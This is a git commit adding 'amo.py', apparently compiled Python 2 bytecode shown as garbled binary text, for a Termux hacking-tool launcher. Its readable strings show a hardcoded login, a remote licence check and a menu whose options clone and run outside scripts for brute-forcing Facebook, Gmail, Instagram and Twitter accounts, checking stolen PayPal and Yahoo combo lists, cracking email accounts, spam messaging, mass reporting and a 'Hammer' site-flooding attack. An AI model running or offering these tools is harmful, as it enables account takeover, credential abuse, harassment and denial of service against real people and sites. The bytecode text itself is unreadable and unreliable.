92cf8196d1a70284c464a7a62805f633ca890afd
fardinHack <88026058+fardinHack@users.noreply.github.com>
2021-07-29 10:17:41 +0300

    Rename amo. py to amo.py
    git clone  https://github.com/fardinHack/amosoftware.git
    ls
    cd amosoftware
    ls
    python2 amo.py

---
+++ amo.py
@@ -0,0 +1,440 @@
+ó
+2Tac@sDddlZddlZddlZddlZddlZddlZddlZddlZddlZddl	Z	ddl
+Z
+ddlZddlZdGHej
+dƒdGHejdƒxJedƒD]<ZejddƒZed	d
+ƒe_eGHejjƒqÍWyddlZWnek
+r=ejdƒnXyddlZWn8ek
+rˆejdƒej
+dƒejd
+ƒnXddlZddlZddlZddlZddlZddlZddlZddlZddlZddl	Z	ddl
+Z
+ddlZddlZddlmZddlmZddlmZeeƒejdƒejƒZej e!ƒejdƒejdƒejdƒeddƒZ"xe"D]Z#e#j$ƒZ%qÂWej&dƒZ'e'j(Z)ddfge_*ddfge_*d„Z+d„Z,ejdƒd„Z-d „Z.d!„Z/d"„Z0d#Z1ga2gZ3ga4d$Z5d%Z6ejdƒej
+d&ƒejdƒd'Z7d(Z8d)Z9d*Z:ejdƒe8GHd+Z;x’e;d+krfe<d,ƒZ=e<d-ƒZ>e>e9krQe<d.ƒZ?e?e:kr<d/e=GHej
+d0ƒd1Z;nd2GHejd3ƒnd4GHejd3ƒqÕWd5„Z@d6„ZAd7„ZBeCd8kr˜eAƒnejd9ƒx˜e)j$ƒD]4ZDeDGHeDe%d#kræeCd8krãeAƒnnq²Wejdƒejd:ƒd;GHd<ZEeEGHd=e%d#GHd>GHej
+dƒejjFƒdS(?iÿÿÿÿNs[1;91mAMO is[1;92mSOFTWAREsrm -rf .txtiø$iGôi–˜s.txttas4No Module Named Requests! type:pip2 install requestss6No Module Named Mechanize! type:pip2 install mechanizesThen type: python2 fbi.py(t
+ThreadPool(tConnectionError(tBrowsertutf8tclearsrm -rf id-active.txtsid -u > id-active.txts
+id-active.txttrsDhttps://raw.githubusercontent.com/MrTLYAK/active.txt/main/active.txts
+User-AgentsTOpera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.6.423 Version/12.16s
+user-agentsDalvik/1.6.0 (Linux; U; Android 4.6.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]cCsdGHtjjƒdS(NsThanks.(tostsystexit(((s/sdcard/amo/amoo00ooop.pytkeluar1scCsSd}d}x:tD]2}|d|tjdt|ƒdƒ|7}qWt|ƒS(Ntahtdzjctt!ii(txtrandomtrandinttlentcetak(tbtwtdti((s/sdcard/amo/amoo00ooop.pytacak6s
+
+0smkdir anggaxd/cloned.txtcCs~d}xA|D]9}|j|ƒ}|jd|dtd|ƒƒ}q
+W|d7}|jddƒ}tjj|dƒdS(NRs!%ss[%s;1mis[0ms!0s
+(tindextreplacetstrRtstdouttwrite(RRRtjR((s/sdcard/amo/amoo00ooop.pyRAs
+(
+cCsCx<|dD]0}tjj|ƒtjjƒtjdƒqWdS(Ns
+gš™™™™™É?(RRRtflushttimetsleep(tzte((s/sdcard/amo/amoo00ooop.pytjalanLs
+cCsFdddg}x0|D](}d|GtjjƒtjdƒqWdS(Ns.   s..  s... s
+[1;93mWAIT PLEASE  [1;93mi(RRRRR (ttitikto((s/sdcard/amo/amoo00ooop.pyttikSs
+
+
+cCsCx<|dD]0}tjj|ƒtjjƒtjdƒqWdS(Ns
+g{®Gáz”?(RRRRRR (R!R"((s/sdcard/amo/amoo00ooop.pytpsb\s
+is
+[31mNot Vulns	[32mVulngš™™™™™É?s2 
+[1;93m
+
+        888       88        88 88======88
+       88 88      88 88  88 88 88      88
+      88   88     88   88   88 88      88
+     88 === 88    88        88 88      88
+    88       88   88        88 88      88
+   88         88  88        88 88      88
+  88           88 88        88 88======88
+
+sƒ 
+[1;93m
+
+        888       88        88 88======88
+       88 88      88 88  88 88 88      88
+      88   88     88   88   88 88      88
+     88 === 88    88        88 88      88
+    88       88   88        88 88      88
+   88         88  88        88 88      88
+  88           88 88        88 88======88
+                                        
+                                        
+tAMOtACKERMANttruesWHAT IS YOUR NAME :s[1;97mâž£[31;1mUserName: s[1;97mâž£[31;1mPassword: s[1;92m[âœ“]  successfull  itfalses
+PASS ERRORs@xdg-open https://www.facebook.com/profile.php?id=100071111050271s
+USER ERRORcCstjdƒtƒdS(NR(Rtsystemtmenu(((s/sdcard/amo/amoo00ooop.pytlisensi–s
+cCs0tjdƒtGHdGHdGHdGHdGHdGHdGHdGHd	GHd
+GHdGHdGHd
+GHdGHdGHdGHdGHdGHdGHd
+GHdGHdGHdGHdGHdGHdGHd
+GHdGHdGHdGHdGHdGHd
+GHdGHd GHd!GHd
+GHd"GHd#GHd$GHd
+GHd%GHd&GHd'GHd
+GHd(GHd)GHd
+GHd*GHd+GHd,GHd-GHd.GHd/GHd0GHd1GHtƒdS(2NRs6[1;90m===============================================s1[1;92m[1][1;97m CRACK NUMBER FREE MOD Very-Fasts%[1;92m[2][1;97m HACK FACEBOOK LOGINs([1;92m[3][1;97m CRACK NUMBER ADD PASS s([1;92m[4][1;97m CHECKER USER SNAPCHAT s6[1;92m[5][1;97m CRACK NUMBER KURDISTAN-IRAQ 1122 htds/[1;92m[6][1;97m CRACK NUMBER SUDIA 112233-HTDs1[1;92m[7][1;97m CRACK NUMBER NAME+123+123456789s-[1;90m______________________________________s/[1;92m[8][1;97m CHECKER LINK PUBG WITH NUMBERs-[1;92m[9][1;97m CHECKER LINK PUBG WITH MAILs/[1;92m[10][1;97m CHECKER INSTAGRAM WITH YAHOOs+[1;92m[11][1;97m CHEKER GMAIL WITH COMBO s-[1;92m[12][1;97m CHEKER TWITTER WITH COMBO s,[1;92m[13][1;97m CHEKER USERNAME INSTAGRAMs)[1;92m[14][1;97m CHEKER USERNAME TIKTOKs*[1;92m[15][1;97m CHEKER YAHOO WITH COMBOs+[1;92m[16][1;97m CHEKER PAYPAL WITH COMBOs,[1;92m[17][1;97m BRUTE FORCE FB WITH COMBOs/[1;92m[18][1;97m BRUTE FORCE FB JUST NAME HTDs$[1;92m[19][1;97m BRUTE FORCE GMAILs([1;92m[20][1;97m BRUTE FORCE INSTAGRAMs&[1;92m[21][1;97m BRUTE FORCE TWITTERs'[1;92m[22][1;97m BRUTE FORCE SNAPCHATs)[1;92m[23][1;97m SPAM MESSAGE INSTAGRAMs+[1;92m[24][1;97m SPAM MESSAGE Mesenger FBs([1;92m[25][1;97m SPAM MESSAGE SNAPCHATs[1;92m[26][1;97m ATTACK SITEs([1;92m[27][1;97m SPAM MESSEGE TELEGRAMs)[1;92m[28][1;97m CRACK GMAIL JUST GMAILs)[1;92m[29][1;97m CRACK YAHOO JUST YAHOOs-[1;92m[30][1;97m CRACK HOTMAIL JUST HOTMAILs#[1;92m[31][1;97m REPORT INSTAGRAMs![1;92m[32][1;97m REPORT TIKTOK s"[1;92m[33][1;97m REPORT FACEBOOKs![1;92m[34][1;97m ARRANGE TERMUXs[1;92m[35][1;97m LOGO TERMUXs[1;92m[36][1;97m THEME TERMUXs8[1;92m[37][1;97m Hack View Folowers Like Coment Tiktoks;[1;92m[38][1;97m Hack Viwe Like Coment Folowers Instagrams[1;92m[39][1;97m TIKTOK MEs[1;92m[40][1;97m CHANNEL T.mes%[1;92m[41][1;97m CHANNEL YOUTUBE MEs [1;92m[42][1;97m T.me OFFICIALs"[1;92m[43][1;97m TO BY ANITHING s[1;92m[44][1;97m TO ASK. s$
+[1;92m[0][1;97m  EXIT            s5[1;90m==============================================(RR,tlogotaction(((s/sdcard/amo/amoo00ooop.pyR-›st
+cCsÐtdƒ}|dkr'dGHtƒn6|dkr·tjdƒtjdƒy=d}x0t|dƒjƒD]}tj|jƒƒqlWWq]t	k
+r³d	GHtd
+ƒt
+ƒq]Xn¦|dkrGtjdƒtjdƒy=d}x0t|dƒjƒD]}tj|jƒƒqüWWq]t	k
+rCd	GHtd
+ƒt
+ƒq]Xn|d
+kr+tjdƒtGHdGHddGHy‹tdƒ}tdƒ}tdƒ}tdƒ}tdƒ}tdƒ}d}d}x0t|dƒjƒD]}tj|jƒƒqàWWq]t	k
+r'd	GHtd
+ƒt
+ƒq]Xn2|dkr»tjdƒtjdƒy=d}x0t|dƒjƒD]}tj|jƒƒqpWWq]t	k
+r·d	GHtd
+ƒt
+ƒq]Xn¢|dkrKtjdƒtjdƒy=d}x0t|dƒjƒD]}tj|jƒƒqWWq]t	k
+rGd	GHtd
+ƒt
+ƒq]Xn|dkrÛtjdƒtjdƒy=d}x0t|dƒjƒD]}tj|jƒƒqWWq]t	k
+r×d	GHtd
+ƒt
+ƒq]Xn‚|dkrktjdƒtjdƒy=d}x0t|dƒjƒD]}tj|jƒƒq WWq]t	k
+rgd	GHtd
+ƒt
+ƒq]Xnò|d krûtjdƒtjd!ƒy=d}x0t|dƒjƒD]}tj|jƒƒq°WWq]t	k
+r÷d	GHtd
+ƒt
+ƒq]Xnb|d"kr‹tjdƒtjd#ƒy=d}x0t|dƒjƒD]}tj|jƒƒq@WWq]t	k
+r‡d	GHtd
+ƒt
+ƒq]XnÒ|d$krtjdƒtjd%ƒy=d}x0t|dƒjƒD]}tj|jƒƒqÐWWq]t	k
+rd	GHtd
+ƒt
+ƒq]XnB|d&kr«tjdƒtjd'ƒy=d}x0t|dƒjƒD]}tj|jƒƒq`WWq]t	k
+r§d	GHtd
+ƒt
+ƒq]Xn²|d(kr;tjdƒtjd'ƒy=d}x0t|dƒjƒD]}tj|jƒƒqðWWq]t	k
+r7d	GHtd
+ƒt
+ƒq]Xn"|d)krËtjdƒtjd*ƒy=d}x0t|dƒjƒD]}tj|jƒƒq€WWq]t	k
+rÇd	GHtd
+ƒt
+ƒq]Xn’|d+kr[tjdƒtjd,ƒy=d}x0t|dƒjƒD]}tj|jƒƒqWWq]t	k
+rWd	GHtd
+ƒt
+ƒq]Xn|d-krëtjdƒtjd.ƒy=d}x0t|dƒjƒD]}tj|jƒƒq WWq]t	k
+rçd	GHtd
+ƒt
+ƒq]Xnr|d/kr{	tjdƒtjd0ƒy=d}x0t|dƒjƒD]}tj|jƒƒq0	WWq]t	k
+rw	d	GHtd
+ƒt
+ƒq]Xnâ|d1kr
+tjdƒtjd2ƒy=d}x0t|dƒjƒD]}tj|jƒƒqÀ	WWq]t	k
+r
+d	GHtd
+ƒt
+ƒq]XnR|d3kr›
+tjdƒtjd4ƒy=d}x0t|dƒjƒD]}tj|jƒƒqP
+WWq]t	k
+r—
+d	GHtd
+ƒt
+ƒq]XnÂ|d5kr+tjdƒtjd6ƒy=d}x0t|dƒjƒD]}tj|jƒƒqà
+WWq]t	k
+r'd	GHtd
+ƒt
+ƒq]Xn2|d7kr»tjdƒtjd8ƒy=d}x0t|dƒjƒD]}tj|jƒƒqpWWq]t	k
+r·d	GHtd
+ƒt
+ƒq]Xn¢
+|d9krKtjdƒtjd:ƒy=d}x0t|dƒjƒD]}tj|jƒƒqWWq]t	k
+rGd	GHtd
+ƒt
+ƒq]Xn
+|d;krÛtjdƒtjd8ƒy=d}x0t|dƒjƒD]}tj|jƒƒqWWq]t	k
+r×d	GHtd
+ƒt
+ƒq]Xn‚|d<krk
+tjdƒtjd=ƒy=d}x0t|dƒjƒD]}tj|jƒƒq 
+WWq]t	k
+rg
+d	GHtd
+ƒt
+ƒq]Xnò|d>krû
+tjdƒtjd?ƒy=d}x0t|dƒjƒD]}tj|jƒƒq°
+WWq]t	k
+r÷
+d	GHtd
+ƒt
+ƒq]Xnb|d@kr‹tjdƒtjdAƒy=d}x0t|dƒjƒD]}tj|jƒƒq@WWq]t	k
+r‡d	GHtd
+ƒt
+ƒq]XnÒ
+|dBkrtjdƒtjdCƒy=d}x0t|dƒjƒD]}tj|jƒƒqÐWWq]t	k
+rd	GHtd
+ƒt
+ƒq]XnB
+|dDkr«tjdƒtjd'ƒy=d}x0t|dƒjƒD]}tj|jƒƒq`WWq]t	k
+r§d	GHtd
+ƒt
+ƒq]Xn²	|dEkr;tjdƒtjdFƒy=d}x0t|dƒjƒD]}tj|jƒƒqðWWq]t	k
+r7d	GHtd
+ƒt
+ƒq]Xn"	|dGkrËtjdƒtjdHƒy=d}x0t|dƒjƒD]}tj|jƒƒq€WWq]t	k
+rÇd	GHtd
+ƒt
+ƒq]Xn’|dIkr[tjdƒtjdJƒy=d}x0t|dƒjƒD]}tj|jƒƒqWWq]t	k
+rWd	GHtd
+ƒt
+ƒq]Xn|dKkrëtjdƒtjdLƒy=d}x0t|dƒjƒD]}tj|jƒƒq WWq]t	k
+rçd	GHtd
+ƒt
+ƒq]Xnr|dMkr{tjdƒtjdNƒy=d}x0t|dƒjƒD]}tj|jƒƒq0WWq]t	k
+rwd	GHtd
+ƒt
+ƒq]Xnâ|dOkrtjdƒtjdPƒy=d}x0t|dƒjƒD]}tj|jƒƒqÀWWq]t	k
+rd	GHtd
+ƒt
+ƒq]XnR|dQkr›tjdƒtjdRƒy=d}x0t|dƒjƒD]}tj|jƒƒqPWWq]t	k
+r—d	GHtd
+ƒt
+ƒq]XnÂ|dSkr+tjdƒtjdTƒy=d}x0t|dƒjƒD]}tj|jƒƒqàWWq]t	k
+r'd	GHtd
+ƒt
+ƒq]Xn2|dUkr»tjdƒtjdVƒy=d}x0t|dƒjƒD]}tj|jƒƒqpWWq]t	k
+r·d	GHtd
+ƒt
+ƒq]Xn¢|dWkrKtjdƒtjdXƒy=d}x0t|dƒjƒD]}tj|jƒƒqWWq]t	k
+rGd	GHtd
+ƒt
+ƒq]Xn|dYkrÛtjdƒtjdZƒy=d}x0t|dƒjƒD]}tj|jƒƒqWWq]t	k
+r×d	GHtd
+ƒt
+ƒq]Xn‚|d[krktjdƒtjd\ƒy=d}x0t|dƒjƒD]}tj|jƒƒq WWq]t	k
+rgd	GHtd
+ƒt
+ƒq]Xnò|d]krûtjdƒtjd^ƒy=d}x0t|dƒjƒD]}tj|jƒƒq°WWq]t	k
+r÷d	GHtd
+ƒt
+ƒq]Xnb|d_kr‹tjdƒtjd`ƒy=d}x0t|dƒjƒD]}tj|jƒƒq@WWq]t	k
+r‡d	GHtd
+ƒt
+ƒq]XnÒ|dakrtjdƒtjdbƒy=d}x0t|dƒjƒD]}tj|jƒƒqÐWWq]t	k
+rd	GHtd
+ƒt
+ƒq]XnB|dckr«tjdƒtjddƒy=d}x0t|dƒjƒD]}tj|jƒƒq`WWq]t	k
+r§d	GHtd
+ƒt
+ƒq]Xn²|dekr;tjdƒtjdfƒy=d}x0t|dƒjƒD]}tj|jƒƒqðWWq]t	k
+r7d	GHtd
+ƒt
+ƒq]Xn"|dgkrQt
+ƒndGHtƒtdhƒ}|j
+ttƒdidjGHdkGHdltttƒƒdmtttƒƒGHdnGHtdoƒtjdpƒdS(qNs
+[1;97m CLICK ONE : [1;91mRs[!] Fill In Correctlyt1RsX git clone https://github.com/MrTLYAK/MrTLYAKM.git ;ls ;cd MrTLYAKM ;python2 KakTLYAK.pys.txtRs[!] File Not Founds	
+[ Back ]t2s_ git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python2 Login_With_Fb.pyt3s[1;97m CODES 
+s.[1;97m750-751-752-753-754-780-781-782-783-784s
+s[1;97mCHOOSE CODE: s![1;92[1][1;97Password Yakam   :s [1;92[2][1;97Password Dwam   :s [1;92[3][1;97Password Seim   :s [1;92[4][1;97Password Chwram :s [1;92[1][1;97Password Penjam :s+964t4s_ git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python2 Pass112233HTD.pyt5se git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python2 Pass-hama-ahmed-HTD.pyt6sj git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python2 sudia-arabiPass112233HTD.pyt7sm git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python2 Sudia-Arabia-hama-ahmed-HTD.pyt8sb git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python3 CJEAK-NUMBR-PUBG.pyt9sb git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python3 PUBG-CHECK-Gmail.pyt10sm git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python2 Cheaker-instagram-combolist.pyt11sN git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python2t12t13sj git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python2 cheak-username-instagram.pyt14se git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python3 chealer-tiktok-user.pyt15sb git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python2 chek_combo-yahoo.pyt16sd git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python2 paypal_check-combo.pyt17sp git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python2 Facebook-Brut-Force-combo-pass.pyt18s` git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python2 brute-force-FB.pyt19sc git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python2 brute-force-gmail.pyt20sO git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python2 t21se git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python2 brute-force-twitter.pyt22t23sd git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;bash spam_mesage_instagram.sht24sO git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python3 t25sf git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python3 spam-mesege-snapchat.pyt26sk git clone https://github.com/CruzTed/Hammer/ ;cd Hammer ;python3 hammer.py -s [ip Address] -t 135 example:t27t28s] git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python2 Crack-Gmail.pyt29s] git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python2 Crack-YAHOO.pyt30s_ git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python2 Crack-Hotmail.pyt31sb git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python3 Report_Instagram.pyt32s_ git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python3 Report_Tiktok.pyt33sb git clone https://github.com/PangeranAlvins/Repot3 ;cd Repot3 ;bash install.sh ;python2 Repot3.pyt34s` git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;python2 REKXSTNYTERMUX.pyt35sU git clone https://github.com/Ghafo/BNXT-M4168.git ;ls ;cd BNXT-M4168 ;Termux_Logo.sht36s’pkg update; pkg upgrade ;pkg install git -y ;git clone https://github.com/Bhaviktutorials/T-Remix ;ls ;cd T-Remix ;ls ;chmod +x * ;bash t-remix.sht37sxdg-open https://zefoy.com/t38s1xdg-open https://bigtakip.com/tools/send-followert39sxdg-open @Kak_cjt40sxdg-open https://t.me/TEAM1577t41sxdg-opent42sxdg-open @ofl0lt43s8 https://www.facebook.com/profile.php?id=100071111050271t44s@xdg-open https://www.facebook.com/profile.php?id=100071111050271t0ii*s[1;91m=s,[âœ“][1;93m Process Has Been Completed ....s3[âœ“][1;92m Total successfull/[1;96mcheckpoint : t/s9[âœ“][1;91m CP File Has Been Saved : save/checkpoint.txts
+[Press Enter To Go Back]spython2 .README.md(t	raw_inputR0RR,topent	readlinestidtappendtstriptIOErrorR-R/RtmaptmainRRtokstcpb(tpeaktidlisttlinetctktp((s/sdcard/amo/amoo00ooop.pyR0Øsú
+
+
+
+
+
+
+
+
+
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	)
+t__main__spython2 .Mr1337.pysfiglet ID ACTIVEs<[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[0;1msM  
+  Bo Active Krdni Tool nrxy 15$ 
+
+           Massg Bka La Telegram @ufl0l
+s       ID To >>> s@[90;1m
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[0;1m
+
+
+(GRRRtdatetimeRthashlibtret	threadingtjsonturllibt	cookielibtgetpasstrequestsR R,trangetnRtnmbrR`RRtImportErrort	mechanizetmultiprocessing.poolRtrequests.exceptionsRRtreloadtsetdefaultencodingtbrtset_handle_robotstFalsetuiddRtsplittsptgettmanglistttexttiddt
+addheadersR
+RRR#R&R'tbackRhRbRitvulnottvulnR/tlogo2tCorrectUsernametCorrectPasswordtloopR_tnawttusernametpasswordR.R-R0t__name__tstbaniR	(((s/sdcard/amo/amoo00ooop.pyt<module>s¾œ
+
+
+
+
+
+œ
+
+
+
+
+
+
+				
+					
+
+
+
+	
+			=	ÿÿ_
+
+
+
+
+
+
